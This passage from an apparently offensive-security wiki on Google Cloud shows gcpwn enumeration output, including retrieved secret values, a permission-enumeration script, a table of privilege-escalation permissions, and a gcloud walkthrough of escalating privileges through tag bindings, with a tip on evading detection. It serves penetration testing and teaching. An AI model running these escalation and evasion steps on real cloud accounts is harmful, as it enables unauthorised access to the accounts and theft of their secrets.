newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\nScopes:\n    - N/A\nDefault Project: production-project[TRUNCATED]\nAll Projects:\n\nAccess Token: N/A\n\n[******] Permission Summary for service_user [******]\n- Project Permissions\n  - production-project[TRUNCATED]\n    - compute.instances.list\n- Compute Actions Allowed Permissions\n  - production-project[TRUNCATED]\n    - compute.instances.get\n      - instance-20240630-025631 (instances)\n\n(production-project[TRUNCATED]:service_user)&gt; modules run enum_instances --iam\n[*] Checking production-project[TRUNCATED] for instances...\n[**] Reviewing instance-20240630-025631\n[***] GET Instance\n[***] TEST Instance Permissions\n[SUMMARY] GCPwn found 1 Instances in production-project[TRUNCATED]\n   - zones/us-central1-c                                                                                                                                                                    \n     - instance-20240630-025631                                                                                                                                                             \n(production-project[TRUNCATED]:service_user)&gt; creds info\n\nSummary for service_user:\nEmail: newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\nScopes:\n    - N/A\nDefault Project: production-project[TRUNCATED]\nAll Projects:\n\nAccess Token: N/A\n\n[******] Permission Summary for service_user [******]\n- Project Permissions\n  - production-project[TRUNCATED]\n    - compute.instances.list\n- Compute Actions Allowed Permissions\n  - production-project[TRUNCATED]\n    - compute.instances.get\n      - instance-20240630-025631 (instances)\n    - compute.instances.addAccessConfig\n      - instance-20240630-025631 (instances)\n    - compute.instances.addMaintenancePolicies\n      - instance-20240630-025631 (instances)\n    - compute.instances.addResourcePolicies\n      - instance-20240630-025631 (instances)\n    - compute.instances.attachDisk\n      - instance-20240630-025631 (instances)\n    - compute.instances.createTagBinding\n      - instance-20240630-025631 (instances)\n    - compute.instances.delete\n      - instance-20240630-025631 (instances)\n    - compute.instances.deleteAccessConfig\n      - instance-20240630-025631 (instances)\n    - compute.instances.deleteTagBinding\n      - instance-20240630-025631 (instances)\n    - compute.instances.detachDisk\n      - instance-20240630-025631 (instances)\n    - compute.instances.getEffectiveFirewalls\n      - instance-20240630-025631 (instances)\n    - compute.instances.getGuestAttributes\n      - instance-20240630-025631 (instances)\n    - compute.instances.getIamPolicy\n      - instance-20240630-025631 (instances)\n    - compute.instances.getScreenshot\n      - instance-20240630-025631 (instances)\n    - compute.instances.getSerialPortOutput\n      - instance-20240630-025631 (instances)\n    - compute.instances.getShieldedInstanceIdentity\n      - instance-20240630-025631 (instances)\n    - compute.instances.getShieldedVmIdentity\n      - instance-20240630-025631 (instances)\n    - compute.instances.listEffectiveTags\n      - instance-20240630-025631 (instances)\n    - compute.instances.listReferrers\n      - instance-20240630-025631 (instances)\n    - compute.instances.listTagBindings\n      - instance-20240630-025631 (instances)\n    - compute.instances.osAdminLogin\n      - instance-20240630-025631 (instances)\n    - compute.instances.osLogin\n      - instance-20240630-025631 (instances)\n    - compute.instances.removeMaintenancePolicies\n      - instance-20240630-025631 (instances)\n    - compute.instances.removeResourcePolicies\n      - instance-20240630-025631 (instances)\n    - compute.instances.reset\n      - instance-20240630-025631 (instances)\n    - compute.instances.resume\n      - instance-20240630-025631 (instances)\n    - compute.instances.sendDiagnosticInterrupt\n      - instance-20240630-025631 (instances)\n    - compute.instances.setDeletionProtection\n      - instance-20240630-025631 (instances)\n    - compute.instances.setDiskAutoDelete\n      - instance-20240630-025631 (instances)\n    - compute.instances.setIamPolicy\n      - instance-20240630-025631 (instances)\n    - compute.instances.setLabels\n      - instance-20240630-025631 (instances)\n    - compute.instances.setMachineResources\n      - instance-20240630-025631 (instances)\n    - compute.instances.setMachineType\n      - instance-20240630-025631 (instances)\n    - compute.instances.setMetadata\n      - instance-20240630-025631 (instances)\n    - compute.instances.setMinCpuPlatform\n      - instance-20240630-025631 (instances)\n    - compute.instances.setName\n      - instance-20240630-025631 (instances)\n    - compute.instances.setScheduling\n      - instance-20240630-025631 (instances)\n    - compute.instances.setSecurityPolicy\n      - instance-20240630-025631 (instances)\n    - compute.instances.setServiceAccount\n      - instance-20240630-025631 (instances)\n    - compute.instances.setShieldedInstanceIntegrityPolicy\n      - instance-20240630-025631 (instances)\n    - compute.instances.setShieldedVmIntegrityPolicy\n      - instance-20240630-025631 (instances)\n    - compute.instances.setTags\n      - instance-20240630-025631 (instances)\n    - compute.instances.simulateMaintenanceEvent\n      - instance-20240630-025631 (instances)\n    - compute.instances.start\n      - instance-20240630-025631 (instances)\n    - compute.instances.startWithEncryptionKey\n      - instance-20240630-025631 (instances)\n    - compute.instances.stop\n      - instance-20240630-025631 (instances)\n    - compute.instances.suspend\n      - instance-20240630-025631 (instances)\n    - compute.instances.update\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateAccessConfig\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateDisplayDevice\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateNetworkInterface\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateSecurity\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateShieldedInstanceConfig\n      - instance-20240630-025631 (instances)\n    - compute.instances.updateShieldedVmConfig\n      - instance-20240630-025631 (instances)\n    - compute.instances.use\n      - instance-20240630-025631 (instances)\n    - compute.instances.useReadOnly\n      - instance-20240630-025631 (instances)\n\n(production-project[TRUNCATED]:service_user)&gt; creds info --csv\n^C\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/gcpwn]\n\u2514\u2500$ cd GatheredData/1_demoworkspace/Reports/Snapshots/    \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/GatheredData/1_demoworkspace/Reports/Snapshots]\n\u2514\u2500$ ls\nPermission_Summary_service_user_20240714161752.csv  service_user_1720988272.6552665.csv\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/GatheredData/1_demoworkspace/Reports/Snapshots]\n\u2514\u2500$ cat Permission_Summary_service_user_20240714161752.csv \nCredname,Permission,Asset Type,Asset Name,Project_ID,Flagged\nservice_user,compute.instances.list,Project,production-project[TRUNCATED],production-project[TRUNCATED],False\nservice_user,compute.instances.get,instances,instance-20240630-025631,production-project[TRUNCATED],False\nservice_user,compute.instances.addAccessConfig,instances,instance-20240630-025631,production-project[TRUNCATED],False\nservice_user,compute.instances.addMaintenancePolicies,instances,instance-20240630-025631,production-project[TRUNCATED],False\nservice_user,compute.instances.addResourcePolicies,instances,instance-20240630-025631,production-project[TRUNCATED],False\nservice_user,compute.instances.attachDisk,instances,instance-20240630-025631,production-project[TRUNCATED],False\n</code></pre> <p>As mentiond before, each individual service can have testIamPermission so each enum module can have testIamPermissions. This would kinda stink if you had to run them individually so added an <code>enum_all</code> module which calls ALL enumeration modules. You can pass in <code>--iam</code> to <code>enum_all</code> to run all possible testIamPermissions</p> <pre><code>\u2514\u2500$ python3 main.py \n[*] Found existing sessions:\n  [0] New session\n  [1] DemoWorkspace\n  [2] exit\nChoose an option: 1\n[TRUNCATED]\n\nWelcome to your workspace! Type 'help' or '?' to see available commands.\n\n[*] Listing existing credentials...\n  [1] service_user (service) - newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\n\n\nSubmit the name or index of an existing credential from above, or add NEW credentials via Application Default \nCredentails (adc - google.auth.default()), a file pointing to adc credentials, a standalone OAuth2 Token, \nor Service credentials. See wiki for details on each. To proceed with no credentials just hit ENTER and submit \nan empty string. \n[1] *adc      &lt;credential_name&gt; [tokeninfo]                    (ex. adc mydefaultcreds [tokeninfo]) \n[2] *adc-file &lt;credential_name&gt; &lt;filepath&gt; [tokeninfo]         (ex. adc-file mydefaultcreds /tmp/name2.json)\n[3] *oauth2   &lt;credential_name&gt; &lt;token_value&gt; [tokeninfo]      (ex. oauth2 mydefaultcreds ya[TRUNCATED]i3jJK)  \n[4] service   &lt;credential_name&gt; &lt;filepath_to_service_creds&gt;    (ex. service mydefaultcreds /tmp/name2.json)\n\n*To get scope and/or email info for Oauth2 tokens (options 1-3) include a third argument of \n\"tokeninfo\" to send the tokens to Google's official oauth2 endpoint to get back scope. \ntokeninfo will set the credential name for oauth2, otherwise credential name will be used.\nAdvised for best results. See https://cloud.google.com/docs/authentication/token-types#access-contents.\nUsing tokeninfo will add scope/email to your references if not auto-picked up.\n\nInput: 1\nLoading in Service Credentials...\n[*] Loaded credentials service_user\n(production-project[TRUNCATED]:service_user)&gt; modules run enum_all --iam \n[***********] Beginning enumeration for production-project[TRUNCATED] [***********]\n[*] Beginning Enumeration of RESOURCE MANAGER Resources...\n[*] Searching Organizations\n[*] Searching All Projects\n[*] Searching All Folders\n[*] Getting remainting projects/folders via recursive folder/project list calls starting with org node if possible\n[*] NOTE: This might take a while depending on the size of the domain\n[SUMMARY] GCPwn found or retrieved NO Organization(s)\n[SUMMARY] GCPwn found or retrieved NO Folder(s)\n[SUMMARY] GCPwn found 1 Project(s)\n   - projects/[TRUNCATED] (Production Project 1) - ACTIVE                                                                                                           \n[*] Beginning Enumeration of CLOUD COMPUTE Resources...\n[*] Checking production-project[TRUNCATED] for instances...\n[**] Reviewing instance-20240630-025631\n[***] GET Instance\n[***] TEST Instance Permissions\n[SUMMARY] GCPwn found 1 Instances in production-project[TRUNCATED]\n   - zones/us-central1-c                                                                                                                                            \n     - instance-20240630-025631                                                                                                                                     \n[*] Checking Cloud Compute Project production-project[TRUNCATED]...\n[*] Only first few metadata characters shown, run `data tables cloudcompute-projects --columns project_id,common_instance_metadata` to see all of metadata. Use --csv to export it to a csv.\n[SUMMARY] GCPwn found 1 Compute Project(s) potentially with metadata\n   - production-project[TRUNCATED]                                                                                                                                                            \n[*] Beginning Enumeration of CLOUD FUNCTION Resources...\n[*] Checking production-project[TRUNCATED] for functions...\n[**] Reviewing projects/production-project[TRUNCATED]/locations/us-central1/functions/function-12\n[***] GET Individual Function\n[***] TEST Function Permissions\n[SUMMARY] GCPwn found 1 Function(s) in production-project[TRUNCATED]\n   - [us-central1] function-12                                                                                                                                                              \n[*] Beginning Enumeration of CLOUD STORAGE Resources...\n[*] Checking production-project[TRUNCATED] for HMAC keys...\n[SUMMARY] GCPwn found 1 HMAC Key(s) in production-project[TRUNCATED]\n   - [production-project[TRUNCATED]] GOOG1EV[TRUNCATED] - ACTIVE                                                                                   \n     SA: [TRUNCATED]-compute@developer.gserviceaccount.com                                                                                                                                 \n[*] Checking production-project[TRUNCATED] for buckets/blobs via LIST buckets...\n[**] Reviewing bucket-to-see-how-much-stuff-121212121212\n[***] GET Bucket Object\n[X] 403 The user does not have storage.buckets.get permissions on bucket bucket-to-see-how-much-stuff-121212121212\n[***] TEST Bucket Permissions\n[***] LIST Bucket Blobs\n[X] 403: The user does not have storage.objects.list permissions on\n[**] Reviewing gcf-v2-sources-[TRUNCATED]-us-central1\n[***] GET Bucket Object\n[***] TEST Bucket Permissions\n[***] LIST Bucket Blobs\n[***] GET Bucket Blobs\n[**] Reviewing gcf-v2-uploads-[TRUNCATED]-us-central1\n[***] GET Bucket Object\n[***] TEST Bucket Permissions\n[***] LIST Bucket Blobs\n[**] Reviewing testweoajrpjqfpweqjfpwejfwef\n[***] GET Bucket Object\n[***] TEST Bucket Permissions\n[***] LIST Bucket Blobs\n[SUMMARY] GCPwn found 4 Buckets (with up to 10 blobs shown each) in production-project[TRUNCATED]\n   - bucket-[TRUNCATED]                                                                                                                    \n   - gcf-[TRUNCATED]                                                                                                                      \n     - function-12/function-source.zip                                                                                                                              \n   - gcf-[TRUNCATED]                                                                                                                       \n   - test[TRUNCATED]                                                                                                                                 \n[*] Beginning Enumeration of SECRETS MANAGER Resources...\n[**] [production-project[TRUNCATED]] Reviewing projects/[TRUNCATED]/secrets/test\n[***] GET Base Secret Entity\n[***] TEST Secret Permissions\n[***] LIST Secret Versions\n[****] GET Secret Version 2\n[****] TEST Secret Version Permissions\n[****] GETTING Secret Values For 2\n[****] SECRET VALUE RETRIEVED FOR 2\n[****] GET Secret Version 1\n[****] TEST Secret Version Permissions\n[****] GETTING Secret Values For 1\n[****] SECRET VALUE RETRIEVED FOR 1\n[**] [production-project[TRUNCATED]] Reviewing projects/[TRUNCATED]/secrets/test-location\n[***] GET Base Secret Entity\n[***] TEST Secret Permissions\n[***] LIST Secret Versions\n[****] GET Secret Version 1\n[****] TEST Secret Version Permissions\n[****] GETTING Secret Values For 1\n[****] SECRET VALUE RETRIEVED FOR 1\n[SUMMARY] GCPwn found 2 Secrets in production-project[TRUNCATED]\n   - test                                                                                                                                                           \n     - 1: test121212                                                                                                                                                \n     - 2: test                                                                                                                                                      \n   - test-location                                                                                                                                                  \n     - 1: test121212                                                                                                                                                \n[*] Beginning Enumeration of IAM Resources...\n[*] Checking production-project[TRUNCATED] for service accounts...\n[SUMMARY] GCPwn found 3 Service Account(s) in production-project[TRUNCATED]\n   - [TRUNCATED]-compute@developer.gserviceaccount.com                                                                                                             \n   - newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com                                                                                        \n   - production-project[TRUNCATED]@appspot.gserviceaccount.com                                                                                                      \n[*] Checking production-project[TRUNCATED] for roles...\n[SUMMARY] GCPwn found or retrieved NO Custom Role(s)\n[*] Checking IAM Policy for Organizations...\n[*] Checking IAM Policy for Folders...\n[*] Checking IAM Policy for Projects...\n[*] Checking IAM Policy for Buckets...\n[X] 403: The user does not have storage.buckets.getIamPolicy permissions\n[*] Checking IAM Policy for CloudFunctions...\n[*] Checking IAM Policy for Compute Instances...\n[*] Checking IAM Policy for Service Accounts...\n[*] Checking IAM Policy for Secrets...\n[***********] Ending enumeration for production-project[TRUNCATED] [***********]\n\n(production-project[TRUNCATED]:service_user)&gt; creds info\n\nSummary for service_user:\nEmail: newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\nScopes:\n    - N/A\nDefault Project: production-project[TRUNCATED]\nAll Projects:\n    - production-project[TRUNCATED]\n\nAccess Token: N/A\n\n[******] Permission Summary for service_user [******]\n- Project Permissions\n  - production-project[TRUNCATED]\n    - cloudfunctions.functions.call\n    - cloudfunctions.functions.create\n    - cloudfunctions.functions.list\n    - cloudfunctions.functions.setIamPolicy\n    - cloudfunctions.functions.sourceCodeSet\n    - cloudfunctions.functions.update\n    - compute.disks.create\n    - compute.instances.create\n    - compute.instances.list\n    - compute.instances.setMetadata\n    - compute.instances.setServiceAccount\n    - compute.projects.get\n    - compute.subnetworks.use\n    - compute.subnetworks.useExternalIp\n    - deploymentmanager.deployments.create\n    - iam.roles.update\n    - iam.serviceAccountKeys.create\n    - iam.serviceAccounts.actAs\n    [TRUNCATED]\n- Storage Actions Allowed Permissions\n  - production-project[TRUNCATED]\n    - storage.buckets.delete\n      - bucket[TRUNCATED] (buckets)\n      - gcf-v2-[TRUNCATED] (buckets)\n      - gcf-v2-[TRUNCATED] (buckets)\n      - test[TRUNCATED] (buckets)\n    - storage.buckets.get\n      - gcf-v2-[TRUNCATED] (buckets)\n      - gcf-v2-[TRUNCATED] (buckets)\n      - testw[TRUNCATED] (buckets)\n    - storage.buckets.getIamPolicy\n      - gcf-v2-[TRUNCATED] (buckets)\n      - gcf-v2-[TRUNCATED] (buckets)\n      - testw[TRUNCATED] (buckets)\n    - storage.buckets.setIamPolicy\n      - gcf-v2-[TRUNCATED] (buckets)\n      - gcf-v2-[TRUNCATED] (buckets)\n      - testw[TRUNCATED] (buckets)\n     [TRUNCATED]\n- Secret Actions Allowed Permissions\n  - production-project[TRUNCATED]\n    - secretmanager.secrets.get\n      - test (secrets)\n      - test-location (secrets)\n    - secretmanager.secrets.delete\n      - test (secrets)\n      - test-location (secrets)\n    - secretmanager.secrets.getIamPolicy\n      - test (secrets)\n      - test-location (secrets)\n    - secretmanager.secrets.setIamPolicy\n      - test (secrets)\n      - test-location (secrets)\n    - secretmanager.secrets.update\n      - test (secrets)\n      - test-location (secrets)\n    - secretmanager.versions.get\n      - test (Version: 1) (secret version)\n      - test (Version: 2) (secret version)\n      - test-location (Version: 1) (secret version)\n    - secretmanager.versions.access\n      - test (Version: 1) (secret version)\n      - test (Version: 2) (secret version)\n      - test-location (Version: 1) (secret version)\n    - secretmanager.versions.destroy\n      - test (Version: 1) (secret version)\n      - test (Version: 2) (secret version)\n      - test-location (Version: 1) (secret version)\n    - secretmanager.versions.disable\n      - test (Version: 1) (secret version)\n      - test (Version: 2) (secret version)\n      - test-location (Version: 1) (secret version)\n    - secretmanager.versions.enable\n      - test (Version: 1) (secret version)\n      - test (Version: 2) (secret version)\n      - test-location (Version: 1) (secret version)\n</code></pre>"},{"location":"gcp/enumeration/enumerate_all_permissions/#enumerate-9500-permission-on-orgfolderproject","title":"Enumerate ~9500 Permission on Org/Folder/Project","text":"<p>gcpwn includes a special flag for <code>enum_resources</code> called <code>--all-permissions</code>. When this is used with the <code>--iam</code> flag, gcpwn will attempt ~9500 individual permissions via testIamPermissions. This effectively should tell you every permission the user has in the current resource. Note you can find the list of permissions via the repository. For example, here are all the project permissions it tries. NOTE AGAIN TESTIAMPERMISSIONS IS NOT ACTUALLY ACTIVELY INVOKING THESE APIS. Thus it should be safe to run these all through testIamPermissions. While not shown below you can pass <code>--all-permissions</code> and <code>--iam</code> into <code>enum_all</code> if you want to do this as part of the everything enumeration.</p> <pre><code>(production-project[TRUNCATED]:service_user)&gt; modules run enum_resources --iam --all-permissions\n[*] Searching Organizations\n[*] Searching All Projects\n[*] Checking permissions in batches for projects/[TRUNCATED], note this might take a few minutes (~9000 permissions @ 500/~ 2 min = 36 min)\nCompleted 5/95\nCompleted 10/95\nCompleted 15/95\nCompleted 20/95\nCompleted 25/95\nCompleted 30/95\nCompleted 35/95\nCompleted 40/95\nCompleted 45/95\nCompleted 50/95\nCompleted 55/95\nCompleted 60/95\nCompleted 65/95\nCompleted 70/95\nCompleted 75/95\nCompleted 80/95\nCompleted 85/95\nCompleted 90/95\nCompleted 95/95\n[*] Searching All Folders\n[*] Getting remainting projects/folders via recursive folder/project list calls starting with org node if possible\n[*] NOTE: This might take a while depending on the size of the domain\n[SUMMARY] GCPwn found or retrieved NO Organization(s)\n[SUMMARY] GCPwn found or retrieved NO Folder(s)\n[SUMMARY] GCPwn found 1 Project(s)\n   - projects/[TRUNCATED] (Production Project 1) - ACTIVE\n\n(production-project[TRUNCATED]:service_user)&gt; creds info\n\nSummary for service_user:\nEmail: newserviceaccount@production-project[TRUNCATED].iam.gserviceaccount.com\nScopes:\n    - N/A\nDefault Project: production-project[TRUNCATED]\nAll Projects:\n    - production-project[TRUNCATED]\n\nAccess Token: N/A\n\n[******] Permission Summary for service_user [******]\n- Project Permissions\n  - production-project[TRUNCATED]\n    - accessapproval.requests.approve\n    - accessapproval.requests.dismiss\n    - accessapproval.requests.get\n    - accessapproval.requests.invalidate\n    - accessapproval.requests.list\n    - accessapproval.serviceAccounts.get\n    - accessapproval.settings.delete\n    - accessapproval.settings.get\n    - accessapproval.settings.update\n    - actions.agent.claimContentProvider\n    [TRUNCATED]\n    - workloadmanager.insights.export\n    - workloadmanager.insights.write\n    - workloadmanager.locations.get\n    - workloadmanager.locations.list\n    - workloadmanager.operations.cancel\n    - workloadmanager.operations.delete\n    - workloadmanager.operations.get\n    - workloadmanager.operations.list\n    - workloadmanager.results.list\n    - workloadmanager.rules.list\n    - workstations.operations.get\n    - workstations.workstationClusters.create\n    - workstations.workstationClusters.delete\n    - workstations.workstationClusters.get\n    - workstations.workstationClusters.list\n    - workstations.workstationClusters.update\n    - workstations.workstationConfigs.create\n    - workstations.workstationConfigs.delete\n    - workstations.workstationConfigs.get\n    - workstations.workstationConfigs.getIamPolicy\n    - workstations.workstationConfigs.list\n    - workstations.workstationConfigs.setIamPolicy\n    - workstations.workstationConfigs.update\n    - workstations.workstations.create\n    - workstations.workstations.delete\n    - workstations.workstations.get\n    - workstations.workstations.getIamPolicy\n    - workstations.workstations.list\n    - workstations.workstations.setIamPolicy\n    - workstations.workstations.start\n    - workstations.workstations.stop\n    - workstations.workstations.update\n</code></pre>"},{"location":"gcp/enumeration/enumerate_service_account_permissions/","title":"Enumerate Service Account Permissions","text":"<p>Link to Tool: GitHub</p> <p>On GCP it is possible to use the <code>projects.testIamPermissions</code> method to check the permissions that a caller has on the specified Project.</p> <p>To enumerate permissions you will need either a service account key file or an access token as well as the project ID.</p> <p>Info</p> <p>The project ID can be retrieved from the metadata endpoint at <code>/computeMetadata/v1/project/project-id</code></p> <p>The following script taken from the ThunderCTF repository can be used to enumerate permissions:</p> <pre><code>from googleapiclient import discovery\nimport google.oauth2.service_account\nfrom google.oauth2.credentials import Credentials\nimport os, sys\nfrom permissions import permissions\n\nif len(sys.argv) != 2:\n    sys.exit(\"Usage python test-permissions &lt;token | path_to_key_file&gt;\")\n\nif os.getenv('GOOGLE_CLOUD_PROJECT'):\n    PROJECT_ID = os.getenv('GOOGLE_CLOUD_PROJECT')\n    print(PROJECT_ID)\nelse:\n    sys.exit(\"Please set your GOOGLE_CLOUD_PROJECT environment variable via gcloud config set project [PROJECT_ID]\")\n\nif (os.path.exists(sys.argv[1])):\n    print(f'JSON credential: {sys.argv[1]}')\n    # Create credentials using service account key file\n    credentials = google.oauth2.service_account.Credentials.from_service_account_file(sys.argv[1])\nelse:\n    print(f'Access token: {sys.argv[1][0:4]}...{sys.argv[1][-4:]}')\n    ACCESS_TOKEN = sys.argv[1]\n    # Create credentials using access token\n    credentials = Credentials(token=sys.argv[1])\n\n# Split testable permissions list into lists of 100 items each\nchunked_permissions = (\n    [permissions[i * 100:(i + 1) * 100] for i in range((len(permissions)+99) // 100)])\n\n# Build cloudresourcemanager REST API python object\ncrm_api = discovery.build('cloudresourcemanager',\n                          'v1', credentials=credentials)\n\n# For each list of 100 permissions, query the api to see if the service account has any of the permissions\ngiven_permissions = []\nfor permissions_chunk in chunked_permissions:\n    response = crm_api.projects().testIamPermissions(resource=PROJECT_ID, body={\n        'permissions': permissions_chunk}).execute()\n    # If the service account has any of the permissions, add them to the output list\n    if 'permissions' in response:\n        given_permissions.extend(response['permissions'])\n\nprint(given_permissions)\n</code></pre>"},{"location":"gcp/enumeration/enumerate_service_account_permissions/#updating-the-list-of-permissions","title":"Updating the list of permissions","text":"<p>The file containing the list of permissions needs to be created / updated before using the enumeration script.</p> <p>The file <code>permissions.py</code> should look like this:</p> <pre><code>permissions = [\n  'accessapproval.requests.approve',\n  ...\n  'vpcaccess.operations.list'\n]\n</code></pre> <p>The list of existing permissions can be obtained from the IAM permissions reference page or from the IAM Dataset powering gcp.permissions.cloud.</p>"},{"location":"gcp/exploitation/gcp_iam_privilege_escalation/","title":"Privilege Escalation in Google Cloud Platform","text":"Permission \u00a0Resources <code>cloudbuilds.builds.create</code> Script / Blog Post <code>cloudfunctions.functions.create</code> Script / Blog Post <code>cloudfunctions.functions.update</code> Script / Blog Post <code>cloudscheduler.jobs.create</code> Blog Post <code>composer.environments.get</code> Blog Post 1, 2 <code>compute.instances.create</code> Script / Blog Post <code>dataflow.jobs.create</code> Blog Post 1, 2 <code>dataflow.jobs.update</code> Blog Post 1, 2 <code>dataproc.clusters.create</code> Blog Post 1, 2 <code>dataproc.clusters.create</code> Blog Post 1, 2 <code>dataproc.jobs.create</code> Blog Post 1, 2 <code>dataproc.jobs.update</code> Blog Post 1, 2 <code>deploymentmanager.deployments.create</code> Script / Blog Post <code>iam.roles.update</code> Script / Blog Post <code>iam.serviceAccountKeys.create</code> Script / Blog Post <code>iam.serviceAccounts.getAccessToken</code> Script / Blog Post <code>iam.serviceAccounts.implicitDelegation</code> Script / Blog Post <code>iam.serviceAccounts.signBlob</code> Script / Blog Post <code>iam.serviceAccounts.signJwt</code> Script / Blog Post <code>orgpolicy.policy.set</code> Script / Blog Post <code>run.services.create</code> Script / Blog Post <code>serviceusage.apiKeys.create</code> Script / Blog Post <code>serviceusage.apiKeys.list</code> Script / Blog Post <code>storage.hmacKeys.create</code> Script / Blog Post"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/","title":"Tag Your Way In - GCP Privilege Escalation Using Tags","text":"<ul> <li> <p> Original Research</p> <p> <p>Tag Your Way In: New Privilege Escalation Technique in GCP by Ariel Kalman</p> <p></p> </p> </li> </ul> <p>GCP IAM Conditions allow fine-grained access control using context like time, resource type, and tags\u2014but those same tags can enable unexpected privilege escalation. In this post, we show how a user with only viewer and tagUser roles can escalate to full admin access without changing any IAM policy.</p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#background","title":"Background","text":""},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#conditional-access-based-on-tags","title":"Conditional Access Based on Tags","text":"<p>In GCP, IAM policies control access by assigning roles to members on resources, optionally using conditions based on request time, IP address, or resource tags. Tags are key-value pairs that can be inherited and used in IAM Conditions, such as resource.matchTag('env', 'sandbox'), to enforce fine-grained access control.</p> <p>For example, this is an IAM policy with a resource tag condition: <pre><code>{\n  \"bindings\": [\n    {\n      \"condition\": {\n        \"description\": \"Only allow access if a resource is tagged env=sandbox\",\n        \"expression\": \"resource.matchTag('env', 'sandbox')\",\n        \"title\": \"SandboxTagCondition\"\n      },\n      \"members\": [\n        \"group:sandbox_users@**************\"\n      ],\n      \"role\": \"roles/compute.admin\"\n    }\n}\n</code></pre></p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#tagbindings-and-role-based-tag-management","title":"TagBindings and Role-Based Tag Management","text":"<p>Tags are attached to resources using tagBindings, which link a resource to a specific tagValue.</p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#tag-management-roles","title":"Tag Management Roles","text":"<p>In GCP, tag management access is controlled using the following IAM roles:</p> <ul> <li><code>roles/resourcemanager.tagViewer</code></li> <li><code>roles/resourcemanager.tagUser</code></li> <li><code>roles/resourcemanager.tagAdmin</code></li> </ul> <p>Tip</p> <p>To evade detection, an attacker could perform the tag binding and the privileged action in separate sessions or with a time gap greater than X minutes, breaking the detectable sequence used in correlation rules</p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#how-to-exploit","title":"How to Exploit","text":""},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#1-enumerate-iam-policies","title":"1. Enumerate IAM Policies","text":"<p><pre><code>gcloud projects get-iam-policy &lt;PROJECT_ID&gt;\n</code></pre> Required Role: <code>roles/resourcemanager.projects.getIamPolicy</code> Impact:  Discover IAM bindings and tag-based conditions</p> <p></p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#2-list-available-tags","title":"2. List Available Tags","text":"<p><pre><code>gcloud resource-manager tags keys list --parent=folders/&lt;FOLDER_ID&gt;\ngcloud resource-manager tags values list --parent=tagKeys/&lt;TAG_KEY_ID&gt;\n</code></pre> Required Role: <code>roles/resourcemanager.tagUser</code> Impact:  Enumerate tag keys and values.</p> <p></p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#3-bind-tags-to-resource","title":"3. Bind Tags to Resource","text":"<p><pre><code>gcloud resource-manager tags bindings create \\\n  --tag-value=tagValues/&lt;TAG_VALUE_ID&gt; \\\n  --parent=//cloudresourcemanager.googleapis.com/projects/&lt;PROJECT_ID&gt;\n</code></pre> Required Role: <code>roles/resourcemanager.tagUser</code> Impact:  Attach tags to satisfy IAM conditions.</p> <p></p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#4-exploit-conditional-access","title":"4. Exploit Conditional Access","text":"<p><pre><code>gcloud compute instances delete-access-config instance-&lt;INSTANCE_NAME&gt; \\\n  --zone=us-central1-c \\\n  --access-config-name=\"External NAT\" \\\n  --network-interface=nic0\n</code></pre> Required Role: <code>roles/compute.admin</code> Impact:  A privileged operation succeeded using elevated permissions (in this case, the removal of a public IP address from a GCE instance).</p> <p></p> <p>Warning</p> <p>The granted privileged role depends entirely on the IAM policy. If the policy assigns <code>roles/compute.admin</code> to resources with the tag, that's what the attacker gets, but it could just as easily be <code>roles/compute.viewer</code> or any other role.</p>"},{"location":"gcp/exploitation/tagbindings_privilege_escalation/#impact","title":"Impact","text":"<p>This privilege escalation technique can lead to unauthorized access, full admin control over key services, and long-term persistence by exploiting dynamic tag-based IAM conditions. It\u2019s a realistic risk: public Terraform modules frequently assign the tagUser role to non-admins like CI/CD accounts or integration service accounts, as seen in examples from terraform-example-foundation and cloud-foundation-fabric.</p> <p>Note</p> <p>For a deeper technical walkthrough, check out the full blog post or contact me for more information.</p>"},{"location":"gcp/general-knowledge/default-account-names/","title":"Default Account Information","text":""},{"location":"gcp/general-knowledge/default-account-names/#service-accounts","title":"Service Accounts","text":"<p>Service accounts are similar to Azure Service Principals. They can allow for programmatic access but also abuse. </p> <p>Information on Service Accounts</p> <p>User-Created Service Account: <code>service-account-name@project-id.iam.gserviceaccount.com</code></p> <p>Using the format above, you can denote the following items:</p> <ul> <li><code>service-account-name</code>: This will tell you potentially what services this is for: <code>Bigtable-sa</code> or <code>compute-sa</code></li> <li><code>project-id</code>: This will be the project identifier that the service account is for. You can set your <code>gcloud</code> configuration to this <code>project-id</code>. It will be numerical typically.</li> </ul>"},{"location":"gcp/general-knowledge/default-account-names/#default-service-account-filename-permutations","title":"Default Service Account filename permutations:","text":"<ul> <li><code>serviceaccount.json</code></li> <li><code>service_account.json</code></li> <li><code>sa-private-key.json</code></li> <li><code>service-account-file.json</code></li> </ul>"},{"location":"gcp/general-knowledge/default-account-names/#application-based-service-account","title":"Application-Based Service Account:","text":"<ul> <li><code>project-id@appspot.gserviceaccount.com</code>: Ths would be <code>project-id</code> value for App Engine or anything leveraging App Engine.</li> <li><code>project-number-compute@developer.gserviceaccount.com</code>: This service account is for Compute Engine where the <code>project-number-compute</code> will be: <code>project-id</code>-<code>compute</code>. I.E. <code>1234567-compute</code>.</li> </ul>"},{"location":"gcp/general-knowledge/default-account-names/#how-to-use-service-accounts","title":"How to use Service Accounts","text":"<p>In a BASH (or equivalent) shell: <code>export GOOGLE_APPLICATION_CREDENTIALS=\"/home/user/Downloads/service-account-file.json\"</code></p>"},{"location":"gcp/general-knowledge/gcp-buckets/","title":"Hunting GCP Buckets","text":"<p>GCP 